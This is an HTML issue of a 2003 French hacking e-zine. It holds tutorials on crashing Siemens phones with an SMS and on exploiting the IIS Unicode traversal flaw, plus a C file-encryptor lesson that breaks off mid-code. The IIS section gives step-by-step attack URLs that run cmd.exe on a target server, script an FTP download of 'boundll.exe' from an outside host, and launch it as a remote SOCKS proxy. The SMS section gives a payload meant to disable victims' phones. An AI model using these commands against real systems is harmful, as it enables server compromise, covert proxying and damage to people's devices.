<HTML>
<HEAD>
<STYLE>INPUT {
	BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-WEIGHT: normal; FONT-SIZE: 11px; BORDER-LEFT: #000000 1px solid; COLOR: #000000; BORDER-BOTTOM: #000000 1px solid; FONT-FAMILY: verdana; BACKGROUND-COLOR: #FFFFFF
}
.text {
	FONT-WEIGHT: normal; FONT-SIZE: 11px; COLOR: #a9bfc7; FONT-FAMILY: verdana
}
TEXTAREA {
	BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-WEIGHT: normal; FONT-SIZE: 11px; BORDER-LEFT: #000000 1px solid; COLOR: #000000; BORDER-BOTTOM: #000000 1px solid; FONT-FAMILY: verdana; BACKGROUND-COLOR: #FFFFFF
}
A:link {
	COLOR: #a9bfc7; TEXT-DECORATION: none
}
A:hover {
	COLOR: #e9ffff; TEXT-DECORATION: none
}
A:visited {
	TEXT-DECORATION: none
}
</STYLE>
<TITLE>TDC Mag N&deg;3</TITLE> <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1"> 
</HEAD>

<BODY BGCOLOR="#43575f" TEXT="#CCCCCC" LINK="#a9bfc7" VLINK="#a9bfc7" ALINK="#a9bfc7">
<DIV ALIGN="CENTER"><P><A HREF="http://dealerhacksecurity.free.fr"><IMG SRC="TDC%20files/DHS-bannier.gif" WIDTH="522" HEIGHT="91" BORDER="0"></A></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><B>TDC 
- The Darkunderground Clan</B></FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">************************************************************* 
<BR>\\\\\\\\\\\\\\\\\\\\\\\\ooooooooo:::::<FONT COLOR="#FF0000">DHS</FONT><FONT COLOR="#FF0000"> 
&amp; TDC Mag's N&deg;3</FONT>:::::<FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">ooooo</FONT>oooo//////////////////////</FONT></P></DIV><P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">R&eacute;aliser 
le 30/06/2003</FONT></P><P ALIGN="LEFT"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR></FONT></P><P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">**************************<B><FONT COLOR="#CCCCCC">Contacts</FONT></B>************************** 
<BR>R&eacute;dacteur / Concepteur : <FONT COLOR="#FF0000">A-bone</FONT> =&gt; 
<A HREF="mailto:alex.bone@caramail.com">alex.bone@caramail.com</A> <BR>R&eacute;dacteur 
: <FONT COLOR="#FF0000">Stigmata</FONT> =&gt; <A HREF="mailto:se7en-up@caramail.com">se7en-up@caramail.com</A> 
<BR>***********************************************************</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">///////////////////////////////////////////////////////////////////////////////////////////////// 
<BR>SOMMAIRE PROVISOIRE DU 3<FONT SIZE="1">eme</FONT> NUMERO. <BR>///////////////////////////////////////////////////////////////////////////////////////////////// 
</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2" COLOR="#CCCCCC">1 
-</FONT><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> EDITO : TDC 
Mag N&deg;3<BR><FONT COLOR="#CCCCCC">2 -</FONT> PHREAKING : <B>CRASHING SIEMENS 
PHONES BUFFER OVERFLOW</B> ( EXPLOIT TESTER ). <BR><FONT COLOR="#CCCCCC">3 -</FONT> 
HACKING : <B>LA FAILLE UNICODE</B> comment installer un proxy a distance ( EXPLOIT 
TESTER ).<BR><FONT COLOR="#CCCCCC">4 -</FONT> PROGRAMMATION : <B>ENCRYPTEUR EN 
C</B><br>5 - SECURITE : </FONT><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Protections 
contre l'exploitation des d&eacute;bordements de buffer <B>(Part I</B></FONT><B><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">)</FONT><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">.</FONT></B><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>///////////////////////////////////////////////////////////////////////////////////////////////// 
<BR></FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
<BR>1. EDITO.<BR>===================================================================== 
</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Bon, cette fois, 
c'est (re)parti, l'aventure (re)commence. Les retours que nous avons eu sur le 
<FONT COLOR="#FFFFFF"> <B>TDC Mag N&deg;1</B></FONT> et <B><FONT COLOR="#FFFFFF">2</FONT></B> 
ayant tous &eacute;t&eacute; positifs, nous avons d&eacute;cid&eacute; de lancer 
le TDC Mag N&deg;3 apr&egrave;s 3 mois de silence, ax&eacute; sur un esprit de 
s&eacute;curit&eacute;, ce num&eacute;ro assure une bonne dose d'information combiner 
entre la s&eacute;curit&eacute;, hacking, programmation est phreaking a l'objectif 
de concentrer ici le maximum d'informations sur la fiabilit&eacute; est la s&eacute;curit&eacute; 
des syst&egrave;mes d'exploitations connus, car la s&eacute;curit&eacute; informatique 
concerne tous ceux qui emploient un ordinateur, du programmeur &agrave; l'utilisateur, 
tous les syst&egrave;mes sont concern&eacute;s, MacOS, Windows ou les divers Unix 
pour ne citer que les plus connus.</FONT></P><P></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Nous 
suivrons ici cette m&ecirc;me d&eacute;marche. Avis aux W4rl0rDz[1] qui fleurissent 
sur Internet et t&eacute;l&eacute;chargent ce mag dans l'espoir de trouver comment 
pirater la banque de France : ne t&eacute;l&eacute;chargez plus ce mag (enfin, 
si, vous pouvez quand m&ecirc;me ;) mais un conseil pour vous faire des &eacute;conomies 
nous ne donnerons pas la recette miracle cl&eacute; en main pour pirater les comptes 
des grands FAI. En revanche, nous expliquons d'o&ugrave; vient le probl&egrave;me, 
comment cette vuln&eacute;rabilit&eacute; est exploitable (sans donner le programme 
pour le faire en trois clics de mulot).</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Telle 
est notre d&eacute;marche, et j'esp&egrave;re sinc&egrave;rement qu'elle permettra 
&agrave; tous les acteurs - l'utilisateur, le programmeur, l'administrateur syst&egrave;me 
ou r&eacute;seau et surtout le d&eacute;cideur - d'accro&icirc;tre la s&eacute;curit&eacute; 
des syst&egrave;mes d'information. </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Je 
vous laisse d&eacute;couvrir le sommaire et vous souhaite bonne lecture</FONT>.<BR></P><P>&nbsp;</P><P></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
<BR>2 . PHREAKING : <B>CRASHING SIEMENS PHONES BUFFER OVERFLOW</B> ( EXPLOIT TESTER 
).<BR>===================================================================== </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Date 
: 02/06/2003<BR>Auteur : <A HREF="mailto:alex.bone@caramail.com">A-bone</A><BR> 
Sujet : </FONT><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Crashing 
siemens phones buffer overflow</FONT><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
.</FONT><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR> Produit : Simens 
CORP .</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><B><FONT COLOR="#FF0000">Attention 
:</FONT></B> <BR>Ce mini tutorial n'incite pas &agrave; l'augmentation d'acte 
de piratage, il permet simplement la compr&eacute;hension, et la m&eacute;thode 
des techniques utilis&eacute; par <BR>les Phreaker's de nos jour.<BR></FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Je 
commence par dire que la s&eacute;rie 45 des t&eacute;l&eacute;phones mobiles 
Siemens poss&egrave;de un bug tr&egrave;s int&eacute;ressant au niveau de la pile 
m&eacute;moire qui joue un grand r&ocirc;le au niveau du ces t&eacute;l&eacute;phones 
et leurs syst&egrave;mes pour effectuer des taches tel que l'agenda, heure, date, 
enregistrer des num&eacute;ro sur la m&eacute;moire du t&eacute;l&eacute;phone 
et non la carte SIM etc... </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">L'exploit 
dont je vous parle je l'ai d&eacute;couvert par hasard en effectuant quelques 
essayes tr&egrave;s simples et je me suis rendu compte qu'en envoyant un message 
bidon de quelque lignes du codes permet n'importe qui de faire crasher un phone 
de cette s&eacute;rie en question, nous ne sommes pas des crasher mais il est 
int&eacute;ressant de conna&icirc;tre ce type de de failles (BOF) alors let's 
go .</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR><B><FONT COLOR="#FFFFFF">Probl&egrave;me 
:</FONT></B> </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Tout 
le monde sait que les t&eacute;l&eacute;phones cellulaire sont programm&eacute;s 
en JAVA, et que il est assez facile de crasher un t&eacute;l&eacute;phone. <BR>Il 
suffit d'&eacute;crire un programme puis de l'ex&eacute;cuter sur le t&eacute;l&eacute;phone 
cible, mais tout depant de la s&eacute;curit&eacute; du t&eacute;l&eacute;phone 
ce qui n'est pas le cas pour la s&eacute;rie 45 de siemens .</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif" COLOR="#FFFFFF"><B>Exploit 
:</B></FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR>Il suffit 
d'envoyer un SMS contenant ce code :</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif" COLOR="#FF0000">%</FONT><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
suivie de 157 . comme ceci:</FONT><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR><B><TEXTAREA NAME="Expoit" ROWS="7" COLS="25">%...................................................................................................... 
............................................................................................................................................ 
...................................</TEXTAREA></B></FONT></P><P></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Ou 
: <FONT COLOR="#FF0000">%</FONT> <FONT COLOR="#FFFFFF">suivi de 157 charact&egrave;re 
( n'importe quel genre de charact&eacute;re )</FONT></FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR>Lorsque 
la victime recevra le SMS son t&eacute;l&eacute;phone s'&eacute;teindra et, il 
ne s'allumera plus . </FONT></P><P></P><P><FONT COLOR="#FFFFFF"><B><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Solution 
: </FONT></B></FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR>Aucune 
solution &agrave; ce BOF car il efface la m&eacute;moire du cellulaire ,bien sur 
vous pourrez toujours l'envoyer a Siemens CORP qui vous le changera ou vous le 
&quot;remboursera&quot; .<BR></FONT></P><P ALIGN="CENTER">&nbsp;</P><P ALIGN="CENTER"><B><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2" COLOR="#FF0000">...::: 
Crashing Siemens Phone Buffer Overflow By</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"> 
A-bone <FONT COLOR="#FF0000">:::...</FONT></FONT></B></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
<BR>3 . HACKING : <U> LA FAILLE UNICODE</U> comment installer un proxy a distance 
( EXPLOIT TESTER ).<BR>=====================================================================</FONT></P><P ALIGN=LEFT><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Date 
: 07/05/2003<BR>Auteur : <A HREF="mailto:alex.bone@caramail.com">A-bone</A><BR>Sujet 
: Installation d'un proxy sur un serveur IIS distant .<BR>Produit : IIS server 
.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Dans ce tutorial 
je vais presenter une technique assez peut connus , d'installation de proxy<BR>sur 
un serveur IIS non patch&eacute; ( failles unicodes ).</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><FONT COLOR="#FFFFFF"><B>Information 
:</B></FONT> <BR>Le bug unicode a &eacute;t&eacute; decouvert par la soci&eacute;t&eacute; 
eeyes ( www.eeyes.com ), une instruction envoy&eacute;e au serveur distant permet 
l'affichage d'un repertoire virtuel sur le serveur .<BR>Apres l'execution de ce 
code voir le disque dur voullu , tel le c:\, d:\ etc .... ( comme j'ai expliquer 
dans le TDC Mag N&deg;1 )</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><FONT COLOR="#FFFFFF"><B>Application 
de la faille :</B></FONT></FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Pour 
trouver des serveurs Hackable par unicode rien de tel qu'un petit scaneur, telechargable 
partout sur internet .</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Ma 
presentation ce porte sur une failles precise : /scripts/..%255c../winnt/system32/cmd.exe?/c+dir+c:\</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Apr&egrave;s 
avoir trouv&eacute; un serveur potentiel nous allons lanc&eacute; la procedure 
instalation de notre serveur.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif" COLOR="#FF0000">http://IPSERVEUR/</FONT><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif" COLOR="#FFFF00">scripts/..%255c../winnt/system32/cmd.exe?/c+dir+c:\</FONT><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR>Avec 
ce type d'attaque nous arrivons directement au disque dur c:\</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Le 
but pour nous est de creer un repertoire d'acceuil et de copier le fichier cmd.exe</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">- 
Creation du repertoire :<BR><FONT COLOR="#FF0000">http://IPSERVEUR/</FONT><FONT COLOR="#FFFF00">scripts/..%255c../winnt/system32/cmd.exe?/c+mkdir+c:\test</FONT><BR>Une 
erreur type cgi doit vous apparaitre,</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">- 
maintenant on copie le fichier cmd.exe vers le repertoire test .<BR><FONT COLOR="#FF0000">http://IPSERVEUR/</FONT><FONT COLOR="#FFFF00">scripts/..%255c../winnt/system32/cmd.exe?/c+copy+c:\winnt\system32\cmd.exe+c:\test\cmd2.exe</FONT></FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">la 
commande ci-dessous va nous permette de verifier si le fichier est bien copier 
cmd.exe est bien copier dans le repertoire test .<BR><FONT COLOR="#FF0000">http://IPSERVEUR/</FONT><FONT COLOR="#FFFF00">scripts/..%255c../winnt/system32/cmd.exe?/c+dir+c:\test\</FONT></FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">une 
fois la verification &eacute;ffectu&eacute; nous allons cr&eacute;er un fichier 
texte, celui-ci nous permettra de faire telecharger<BR>au serveur distant le fichier 
qui nous est necessaire.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><B>http://IPSERVEUR/scripts/..%255c../test/cmd2.exe?/c+echo+open+Serveur 
anonym+21&gt;&gt;+c:\test\1.txt<BR>http://IPSERVEUR/scripts/..%255c../test/cmd2.exe?/c+echo+Login+&gt;&gt;+c:\test\1.txt<BR>http://IPSERVEUR/scripts/..%255c../test/cmd2.exe?/c+echo+password+&gt;&gt;+c:\test\1.txt<BR>http://IPSERVEUR/scripts/..%255c../test/cmd2.exe?/c+echo+get+boundll.exe+&gt;&gt;+c:\test\1.txt<BR>http://IPSERVEUR/scripts/..%255c../test/cmd2.exe?/c+echo+quit+&gt;&gt;+c:\test\1.txt</B></FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Une 
fois c'est commande d'ajout de ligne dans le fichier 1.txt terminer, une petite 
verification s'impose.<BR><FONT COLOR="#FF0000">http://IPSERVEUR/</FONT><FONT COLOR="#FFFF00">scripts/..%255c../test/cmd2.exe?/c+type+c:\test\1.txt</FONT></FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">vous 
devriez voir avoir ceci :<BR>open Serveur anonym 21<BR>user Login<BR>password<BR>boundll.exe<BR>quit</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Maintenant 
que notre fichier text est bon nous allons lancer le telechargement du fichier.<BR><FONT COLOR="#FF0000">http://IPSERVEUR/</FONT><FONT COLOR="#FFFF00">scripts/..%255c../test/cmd2.exe?/c+ftp+-i+-n+-v+-s:c:\test\1.txt</FONT></FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Ici 
si la barre de progression de chargement prend de temps a charg&eacute; c'est 
bon !!<BR>Sinon ou vous avez fait une erreur ou le serveur distant est proteger 
par firewall.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">La 
commande suivante permet de verifier l'upload de notre fichier</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif" COLOR="#FF0000">http://IPSERVEUR/</FONT><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif" COLOR="#FFFF00">scripts/..%255c../test/cmd2.exe?/c+dir+c:</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Les 
commandes ci-dessous permettent de cr&eacute;er les paramettres de notre proxy, 
socks etc...<BR><FONT COLOR="#FF0000">http://IPSERVEUR/</FONT><FONT COLOR="#FFFF00">scripts/..%255c../test/cmd2.exe?/c+dir+c:\test\boundll.exe+--port+6668+--socks5+--daemon+--s_user+A-bone+--s_password+A-bone</FONT><BR><B><FONT COLOR="#FFFFFF">Ou 
:</FONT></B> <BR><FONT COLOR="#FF0000">http://IPSERVEUR/</FONT><FONT COLOR="#FFFF00">scripts/..%255c../test/cmd2.exe?/c+c:\inetpub\scripts\boundll.exe+--port+6668+--socks5+--daemon+--s_user+A-bone+--s_password+A-bone</FONT></FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif" COLOR="#FFFFFF">Voila 
dans mon exmple il nous restera plus qu'a ce connecter l'ip du serveur, port 6668 
avec le login et mot de pass : A-bone</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR>Pour 
infos voici quelques commandes permettant le paramettrage du proxy</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
<FONT COLOR="#FFFFFF"><B>Exemples :</B></FONT><BR></FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">&sect;&sect; 
Configuration 1 : &quot;boundll.exe --port 6668 --socks5 --daemon --s_user TEST 
--s_password TEST&quot;</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Ceci 
lancera le proxy sur le port 6668 et pour l'utiliser il faudra utiliser les login/pass: 
TEST/TEST</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">&sect;&sect; 
Configuration 2 : &quot;boundll.exe --port 6668 --socks5 --daemon --s_user TEST 
--s_password Proxy --a_port 6669 --a_user admin --a_password N41r0lF</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Ceci 
lancera le proxy avec la m&ecirc;me configuration que la Configuration 1 mais 
en plus, vous pourrez g&eacute;rer &agrave; distance le proxy en vous tapant: 
<FONT COLOR="#FF0000">http://ip.du.proxy:</FONT><FONT COLOR="#FFFF00">6669</FONT><BR>l'administration 
&agrave; distance ne se r&eacute;sum&eacute; qu'&agrave; deux choses:<BR>- connaitre 
les ip des personnes connect&eacute;es sur le proxy,leur vitesse, et &agrave; 
quelle ip elles sont connect&eacute;es<BR>- stopper le proxy</FONT></P><P><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2" COLOR="#FF0000"><B>le 
ficher : </B></FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"><B><A HREF="Exploit%27s%20files/boundll.exe">boundll.exe</A> 
</B></FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Malgr&eacute; 
que les m&eacute;thodes d'exploit de la failles UNICODE son multiple notre groupe 
DHS essaye de toujours d&eacute;voiler des nouveaut&eacute; de vous faire conna&icirc;tre 
quelque chose de r&eacute;el quelque chose de vrais quelque chose tester , j'esp&egrave;re 
que c'est constructif et a la prochaines :)</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR>Cordialement</FONT></P><P ALIGN="CENTER"><B><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2" COLOR="#FF0000">...::: 
IIS UNICODE Exploit By</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"> 
A-bone <FONT COLOR="#FF0000">:::...</FONT></FONT></B></P><P><BR></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
<BR>4 . PROGRAMMATION : ENCRYPTEUR EN C<BR>===================================================================== 
</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Date : 10/06/2003<BR>Auteur 
: <A HREF="mailto:alex.bone@caramail.com">Nocte</A><BR>Sujet : </FONT><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">ENCRYPTEUR 
EN C</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"> .</FONT><BR></P><P> 
<FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">La programmation en C style 
BTS est so&ucirc;lante, vous en conviendrez...<BR>Alors, en consid&eacute;rant 
que vous connaissiez d&eacute;j&agrave; les bases &eacute;l&eacute;mentaires<BR>de 
programmation en C, on va s'int&eacute;resser &agrave; la pratique. Ainsi, voici 
un<BR>programme que nous allons r&eacute;aliser : un encrypteur en C que nous 
allons<BR>d&eacute;cortiquer dans les moindres d&eacute;tails afin d'apprendre 
par la pratique<BR>d'une part la m&eacute;thode de programmation d'un logiciels 
(architecture de<BR>celui-ci) et, d'autre part, des bases indispensables.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR>I. 
LE PROGRAMME<BR>----------------</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
Commen&ccedil;ons &agrave; &eacute;tudier le programme : il commence par une s&eacute;rie 
de #include<BR>et puis par la fonction main: <BR> <BR>#include &quot;stdio.h&quot; 
<BR>#include &quot;conio.h&quot; <BR>#include &quot;dos.h&quot; <BR>void main(void) 
<BR>{</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Ceci est 
aussit&ocirc;t suivi des d&eacute;clarations des variables : <BR>FILE *sourc,*dest;int 
code,verif,car=0,i,j,sur,oct; <BR>char src[60],dst[60];struct date d;</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">struct 
n'est pas tout &agrave; fait un type de variable, c'est en fait une structure<BR>de 
donn&eacute;es : un groupe contenant plusieurs donn&eacute;es. FILE est aussi 
une<BR>structure mais contenant des informations sur le fichier (son handle, sa<BR>taille, 
ses droits d'acc&egrave;s...) alors que date contient 3 donn&eacute;es : jour,<BR>mois, 
ann&eacute;e ; celles-ci sont toujours appel&eacute;es de la m&ecirc;me mani&egrave;re 
(respectivement<BR>da_day,da_mon et da_year). Mais comme elles sont comprises 
dans une structure,<BR>pour les utiliser il faut utiliser le nom de la structure 
juste devant<BR>avec un point. Ici le nom de la structure est d. Ensuite, nous 
avons les<BR>premi&egrave;res fonctions d'initialisation : <BR>getdate(&amp;d);clrscr();</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">La 
fonction clrscr() d&eacute;finie dans conio.h sert &agrave; effacer l'&eacute;cran 
alors<BR>que la fonction getdate( struct date) permet d'initialiser une structure<BR>date 
&agrave; la date actuelle, c'est &agrave; dire mettre dans da_day le jour, dans<BR>da_mon 
le mois et dans da_year l'ann&eacute;e.<BR>Ensuite une petite routine permet de 
v&eacute;rifier le mill&eacute;naire actuel afin<BR>de n'afficher la date qu'avec 
l'ann&eacute;e sur 2 chiffres : </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">if(d.da_year&lt;2000) 
<BR> {d.da_year-=1900;} <BR> else <BR> {d.da_year-=2000;}<BR>Ceci fait, le programme 
affiche quelques informations : <BR>printf(&quot;\t\tEncrypteur\n&quot;); <BR>printf(&quot;%d/%d/%d\n&quot;,d.da_day,d.da_mon,d.da_year);<BR>On 
constate que lors de l'affichage de la date, les variables sont r&eacute;f&eacute;renc&eacute;es<BR>par 
d.da_day,d.da_mon et d.da_year...<BR>Ensuite, une routine nous permet de demander 
le nom du fichier que l'utilisateur<BR>souhaite encrypter : <BR>get_name: <BR>printf(&quot;Name 
of the file to encrypt or decrypt (with full path):\n&quot;);</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">scanf(&quot;%s&quot;,src); 
<BR>sourc=fopen(src,&quot;rb&quot;); <BR>if(sourc==NULL) <BR> { <BR> printf(&quot;\aError 
opening file:(C)hange/(Q)uit\n&quot;); <BR> ask_erase: <BR> car=getch(); <BR> 
switch(car) <BR> { <BR> case 99: <BR> goto get_name; <BR> case 113: <BR> goto 
end; <BR> default: <BR> goto ask_erase; <BR> } <BR> }</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">A 
l'aide de la fonction scanf(), nous r&eacute;cup&eacute;rons le nom du fichier 
d'origine,<BR>lui attribuons le pointeur de type FILE src via la fonction fopen(), 
puis<BR>v&eacute;rifions l'&eacute;tat du pointeur src. Si celui-ci vaut NULL, 
cela signifie<BR>qu'il s'est produit une erreur lors du chargement du fichier 
Si c'est le<BR>cas, nous demandons &agrave; l'utilisateur s'il veut ressaisir 
un nom ou quitter<BR>le programme. Pour cela nous utilisons la fonction getch() 
combin&eacute;es &agrave;<BR>une structure conditionnelle switch() et_code: <BR>code=0;verif=0; 
<BR>printf(&quot;Entrez votre cl&eacute; de cryptage:&quot;); <BR>get_key: <BR>car=getch(); 
<BR>switch(car) <BR> { <BR> case 13: <BR> goto confirmation_code; <BR> case 27: 
<BR> clrscr(); <BR> printf(&quot;Etes-vou s&ucirc;r ?(Y/N)&quot;); <BR> ask_other: 
<BR> switch(sur) <BR> { <BR> case 121: <BR> sur=getch(); <BR> goto end; <BR> case 
110: <BR> clrscr(); <BR> printf(&quot;Fichier &agrave; encrypter / d&eacute;crypter:\n%s\n&quot;,src);</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
goto get_code; <BR>} <BR>goto ask_other; <BR> default: <BR> code +=car; <BR> printf(&quot;*&quot;); 
<BR> goto get_key; <BR>} <BR>confirmation_code: <BR>printf(&quot;\nConfirmez votre 
cl&eacute; de cryptage:&quot;); <BR>reget_key: <BR>car=getch(); <BR>switch(car) 
<BR> { <BR> case 13: <BR> goto test_cod; <BR> case 27: <BR> clrscr(); <BR> printf(&quot;Etes-vous 
s&ucirc;r ?(Y/N)&quot;); <BR> re_ask: <BR> sur=getch(); <BR> switch(sur) <BR> 
{ <BR> case 121: <BR> goto end; <BR> case 110: <BR> printf(&quot;\nFIchier &agrave; 
encrypter / d&eacute;crypter:\n%s\n&quot;,src);</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
goto get_code; <BR> } <BR> goto re_ask; <BR> default: <BR> verif +=car; <BR> printf(&quot;*&quot;); 
<BR> goto reget_key; <BR> }</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
Cette routine permet donc de stocker dans les variables code et v&eacute;rification<BR>la 
somme des codes ASCII des touches frapp&eacute;es par l'utilisateur en tant<BR>que 
code. C'est une des failles du programme dans la mesure ou les mots<BR>de passes 
&quot;bc&quot; et &quot;ad&quot; seront cod&eacute;s de la m&ecirc;me mani&egrave;re<BR>... 
<BR>test_cod: <BR>if(code==verif) <BR> { <BR> printf(&quot;\nOK...starting working&quot;); 
<BR> goto encrypt; <BR> } <BR> else <BR> { <BR> clrscr(); <BR> printf(&quot;Erreur 
de confirmation de la cl&eacute; de cryptage...&quot;);</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
code=0;verif=0; <BR> printf(&quot;\nFichier &agrave; encrypter ou d&eacute;crypter:\n%s\n&quot;,src);</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
goto get_code; <BR> }<BR>Cette routine permet de v&eacute;rifier que le code rentr&eacute; 
puis confirm&eacute; sont<BR>bien les m&ecirc;mes. Si c'est le cas, le programme 
poursuit l'ex&eacute;cution, sinon<BR>il revient &agrave; la demande de code apr&egrave;s 
avoir r&eacute;initialis&eacute; les variables.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">encrypt: 
<BR>printf(&quot;\nNOm du fichier encrypt&eacute; / d&eacute;crypt&eacute; &agrave; 
g&eacute;n&eacute;rer (full path)<BR>:\n&quot;); <BR>scanf(&quot;%s&quot;,dst); 
<BR>dest=fopen(dst,&quot;rb&quot;); <BR>if(dest!=NULL) <BR> { <BR> fclose(dest); 
<BR> printf(&quot;Ce fichier existe d&eacute;j&agrave; : (O)verwrite / (C)hanger 
son nom?&quot;);</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
re_ask2: <BR> sur=getch(); <BR> switch(sur) <BR> { <BR> case 99: <BR> clrscr(); 
<BR> goto encrypt; <BR> case 111: <BR> goto crypt; <BR> default: <BR> goto re_ask2; 
<BR> } <BR>}<BR>Ce passage demande &agrave; l'utilisateur le nom du fichier vers 
lequel il veut<BR>crypter ou d&eacute;crypter le fichier source. Si celui-ci existe 
d&eacute;j&agrave;, il lui<BR>demande s'il d&eacute;sire l'effacer .Pour cela, 
